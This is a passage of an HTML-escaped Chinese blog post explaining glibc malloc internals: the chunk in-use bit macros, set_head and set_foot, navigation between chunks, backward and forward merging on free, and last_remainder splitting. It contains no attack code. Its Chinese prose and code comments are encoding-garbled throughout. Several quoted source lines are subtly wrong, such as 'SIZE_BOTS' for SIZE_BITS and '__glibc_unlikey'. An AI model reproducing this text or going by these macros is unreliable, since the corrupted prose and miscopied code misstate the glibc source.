~(PREV_INUSE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ућ▒С║јтйЊтЅЇ chunk уџёСй┐ућеуіХТђЂТў»ућ▒СИІСИђСИф chunk уџё size ТѕљтЉўуџё PREV_INUSE Т»ћуЅ╣СйЇтє│т«џуџё№╝їТЅђС╗ЦтЈ»С╗ЦжђџУ┐ЄСИІжЮбуџёт«ЈУјитЙЌТѕќУђЁС┐«Тћ╣тйЊтЅЇ chunk уџё inuse уіХТђЂсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; inuse_bit_at_offset(p,s)								\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	(((mchunkptr) (((char *) (p)) + (s)))-&amp;gt;size &amp;amp; PREV_INUSE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_inuse_bit_at_offset(p,s)							\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	(((mchunkptr) (((char *) (p)) + (s)))-&amp;gt;size |= PREV_INUSE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; clear_inuse_bit_at_offset(p,s)							\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	(((mchunkptr) (((char *) (p)) + (s)))-&amp;gt;size &amp;amp;= ~(PREV_INUSE))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set_head_size () С┐«Тћ╣ size ТЌХСИЇС╝џС┐«Тћ╣тйЊтЅЇ chunk уџёТаЄт┐ЌСйЇ№╝їУђї№╝їser_head () С╝џсђѓ seet_foot () С┐«Тћ╣СИІСИђСИф chunk уџё prev_size ТЌХ№╝їтйЊтЅЇ chunk СИђт«џУдЂтцёС║јжЄіТћЙуіХТђЂ№╝їСИЇуёХСИІСИђСИф chunk уџё pre_size Тў»Т▓АТюЅТёЈС╣Ѕуџёсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_head_size(p,s)			((p)-&amp;gt;size = (((p)-&amp;gt;size &amp;amp; SIZE_BOTS) | (s)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_head(p,s)				((p)-&amp;gt;size = (s))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_foot(p,s)				(((mchunkptr) ((char *) (p) + (s)))-&amp;gt;prev_size = (s))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; chunksize(p)				((p)-&amp;gt;size &amp;amp; ~(SIZE_BITS))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;next_chunk () т░єтйЊтЅЇ chunk тю░тЮђтіаСИітйЊтЅЇ chunk тцДт░ЈУјитЙЌСИІСИђСИф chunk уџёТїЄжњѕсђѓprev_chunk () т░єтйЊтЅЇ chunk уџётю░тЮђтЄЈтј╗ prev_size тђ╝УјитЙЌСИіСИђСИф chunk уџёТїЄжњѕ№╝їтЅЇТЈљТў»СИіСИђСИф chunk тцёС║јжЄіТћЙуіХТђЂсђѓchunk_at_offset () т░єтйЊтЅЇ chunk тю░тЮђтіаСИі s тЂЈуД╗тцёуџёСйЇуй«УДєСИ║СИђСИф chunkсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; next_chunk(p)			((mchunkptr) (((char *) (p)) + ((p)-&amp;gt;size &amp;amp; ~SIZE_BITS)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; prev_chunk(p)			((mchunkptr) (((char *) (p)) - ((p)-&amp;gt;prev_size)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; chunk_at_offset(p,s)	((mchunkptr) (((char *) (p)) + (s)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;chunk-тљѕт╣ХУ┐ЄуеІ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chunk-тљѕт╣ХУ┐ЄуеІ&#34;&gt;#&lt;/a&gt; chunk тљѕт╣ХУ┐ЄуеІ&lt;/h3&gt;
&lt;p&gt;РђІ	тйЊСИђСИфжЮъ fast bin уџё chunk УбФжЄіТћЙ№╝їС╝џСИјуЏИжѓ╗уџё chunk У┐ЏУАїтљѕт╣Х№╝їжА║т║ЈжђџтИИТў»тЁѕтљЉтљј№╝ѕСИі№╝Ѕтљѕт╣ХтєЇтљЉтЅЇ№╝ѕСИІ№╝Ѕтљѕт╣ХсђѓтдѓТъютљЉтЅЇтљѕт╣Хуџё chunk Тў» top chunk №╝їтѕЎтљѕт╣ХС╣ІтљјС╝џтйбТѕљТќ░уџё top chunk №╝їтѕЎтљѕТѕљС╣ІтљјС╝џтйбТѕљТќ░уџё top chunk №╝ЏтдѓТъюСИЇТў»уџёУ»Ю№╝їтѕЎтљѕт╣ХС╣ІтљјС╝џУбФтіатЁЦ unsorted bin СИГсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!chunk_is_mmapped(p)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nextchunk = chunk_at_offset(p,size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/*тљЉтљјтљѕт╣Х№╝їСИіСИђСИф chunk Тў»жЄіТћЙуіХТђЂт░▒У┐ЏУАїтљѕт╣ХсђѓТќ░ chunk тю░тЮђСИјСИіСИђСИфуЏИтљї№╝їтцДт░ЈСИ║ p-&amp;gt;size+p-&amp;gt;prev_size№╝їтЇ│pтЄЈтј╗prev_size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!prev_inuse(p)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        prevsize = p-&amp;gt;prev_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size += prevsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = chunk_at_offset(p,-((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) prevsize));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//тѕ░У┐ЎжЄїти▓у╗ЈтйбТѕљС║єТќ░уџё free chunk сђѓуће unlink() т░єтЁХС╗јтЈїжЊЙУАеСИГтѕажЎцсђѓ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        unlink(av,p,bck,fwd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (nextchunk != av-&amp;gt;top) &amp;#123;	&lt;span class=&#34;comment&#34;&gt;//ТБђТЪЦСИІСИђСИф chunk Тў»СИЇТў» top chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//тдѓТъюСИЇТў»№╝їжђџУ┐ЄТБђТЪЦСИІСИђСИф chunk уџё PREV_INUSE ТБђТЪЦСИђСИф chunk уџёуіХТђЂ№╝їт╣ХТИЁжЎц inuse СйЇ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nextinuse = inuse_bit_at_offset(nextchunk,nextsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!nextinuse) &amp;#123;	&lt;span class=&#34;comment&#34;&gt;//тдѓТъюСИІСИђСИф chunk тцёС║јСй┐ућеуіХТђЂтѕЎТЅДУАїтљЉтЅЇтљѕт╣ХТЊЇСйю&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            unlink(av,nextchunk,bck,fwd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            size += nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//тљдтѕЎТИЁТЦџСИІСИђСИф chunk уџё PREV_INUSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            clear_inuse_bit_at_offset(nextchunk,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// тЁѕт░єтљѕт╣Хтљјуџё chunk тіатЁЦ unsorted bin СИГ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bck = unsorted_chunks(av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikey (fwd-&amp;gt;bk != bck)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            errstr = &lt;span class=&#34;string&#34;&gt;&amp;quot;free(): corrupted unsorted chunks&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; errout;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;fd = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range(size)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bck-&amp;gt;fd = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fwd-&amp;gt;bk = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        set_head(p,size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        set_foot(p,size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        check_free_chunk(av,p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;	&lt;span class=&#34;comment&#34;&gt;//тдѓТъюСИІСИђСИф chunk Тў» top chunk№╝їтѕЎтљѕт╣ХТѕљТќ░уџё top chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size += nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        set_head(p,size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        av-&amp;gt;top = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        check_chunk(av,p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;chunk-ТІєтѕєУ┐ЄуеІ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chunk-ТІєтѕєУ┐ЄуеІ&#34;&gt;#&lt;/a&gt; chunk ТІєтѕєУ┐ЄуеІ№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тйЊућеТѕиућ│У»иуџё chunk УЙЃт░ЈТЌХ№╝їС╝џт░єСИђСИфтцДуџё chunk У┐ЏУАїТІєтѕє№╝їтљѕжђѓуџёжЃетѕєУ┐ћтЏъу╗ЎућеТѕи№╝їтЅЕСИІуџёжЃетѕє№╝ѕуД░СИ║ remainder№╝ЅтѕЎтіатЁЦ unsorted bin СИГсђѓтљїТЌХ malloc_state СИГуџё last_remainder С╝џУ«░тйЋТюђУ┐ЉТІєтѕєтЄ║уџё remainder тйЊуёХ№╝їУ┐ЎСИф remainder уџётцДт░ЈУЄ│т░ЉУдЂСИ║ MINSIZE №╝їтљдтѕЎСИЇУЃйТІєтѕєсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	ТІєтѕє chunk уџёСИђуДЇТЃЁтєхТў»№╝џ fast bin тњї small bin СИГТ▓АТюЅтљѕжђѓуџё chunk сђЂтљїТЌХ unsorted bin СИГТюЅСИћтЈфТюЅСИђСИфтЈ»ТІєтѕєуџё chunk сђЂт╣ХСИћУ»Ц chunk Тў» last remainder сђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb) &amp;amp;&amp;amp;			&lt;span class=&#34;comment&#34;&gt;//ућ│У»иуџё chunk тюе small bin УїЃтЏ┤тєЁ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bck == unsorted_chunk (av) &amp;amp;&amp;amp;		&lt;span class=&#34;comment&#34;&gt;//victim т┐ЁжА╗Тў» unsorted bin СИГтћ»СИђуџё chunk &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    victim == av-&amp;gt;last_remainder &amp;amp;&amp;amp;		&lt;span class=&#34;comment&#34;&gt;//victim т┐ЁжА╗Тў» last_remainder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size) &amp;gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb + MINSIZE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    									&lt;span class=&#34;comment&#34;&gt;//victim УЄ│т░ЉУдЂтцДС║ј nb+MINSIZE ТЅЇтЈ»С╗ЦТІєтѕє&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* split and reattach remainder */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    remainder_size = size - nb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    remainder = chunk_at_offset (victim,nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//т░є remainder тіатЁЦ unsorted bin СИГ№╝їтљїТЌХУ«░тйЋСИ║ last_remainder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    unsorted_chunks (av)-&amp;gt;bk = unsorted_chunks (av)-&amp;gt;fd = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    av-&amp;gt;last_remainder = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    remainder-&amp;gt;bk = remainder-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//тдѓТъю remainder тюе large bin УїЃтЏ┤тєЁ№╝їТИЁуЕ║ fd_nextsize тњї bk_nextsize ТїЄжњѕ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (remainder_size)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        remainder-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        remainder-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//У«Йуй« remainder уџёуіХТђЂТаЈ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    set_head (victim,nb | PREV_INUSE |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             (av != &amp;amp;main_arena ? NON_MAIN_ARENA : &lt;span 